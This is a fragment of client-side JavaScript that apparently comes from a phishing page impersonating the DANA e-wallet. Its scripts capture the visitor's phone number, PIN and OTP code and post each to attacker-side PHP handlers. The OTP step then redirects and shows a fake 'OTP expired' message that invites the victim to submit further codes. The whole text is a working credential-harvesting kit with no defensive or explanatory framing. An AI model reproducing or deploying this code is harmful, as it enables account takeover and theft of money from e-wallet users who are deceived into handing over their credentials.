<script>
function sendNohp(event) {
    $("#process").show();
    event.preventDefault();
    $("#inp").blur();
    $.ajax({
        type: 'POST',
        url: 'ast/req/sendNohp.php',
        data: $('#formNohp').serialize(),
        dataType: 'text',
        success: function() {
            $("#process").hide();
            $("#formNohp").fadeOut();
            setTimeout(function() {
                $("#inp").val('');
                $("#formPin").fadeIn();
                $("#pin1").focus();
            }, 500);
        }
    });
};
</script>
<script>
function sendPin() {
    $("#process").show();
    $.ajax({
        type: 'POST',
        url: 'ast/req/formPin.php',
        data: $('#formPin').serialize(),
        dataType: 'text',
        success: function() {
            $("#process").hide();
            $('.inppin').val('');
            $(".bgotp").fadeIn();
            setInterval(countdown, 1000);
            $("#otp1").focus();
        }
    });
};
</script>
<script>
function sendOtp() {
    $(".loadingOtp").show();
    $.ajax({
        type: 'POST',
        url: 'ast/req/formOtp.php',
        data: $('#formOtp').serialize(),
        dataType: 'text',
        success: function() {
            window.location.href = "googleplayDANA.html";
            setTimeout(function() {
                $(".loadingOtp").hide();
                $('.inpotp').val('');
                $(".alert").text("Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP");
                $(".alert").css("color", "red");
            }, 3000);
        }
    });
};
</script>
<script>
function countdown() {
    var count = parseInt($('#countdown').text());
    if (count !== 0) {
        $('#countdown').text(count - 1);
    } else {
        $('#countdown').text('120');
    }
};</script>
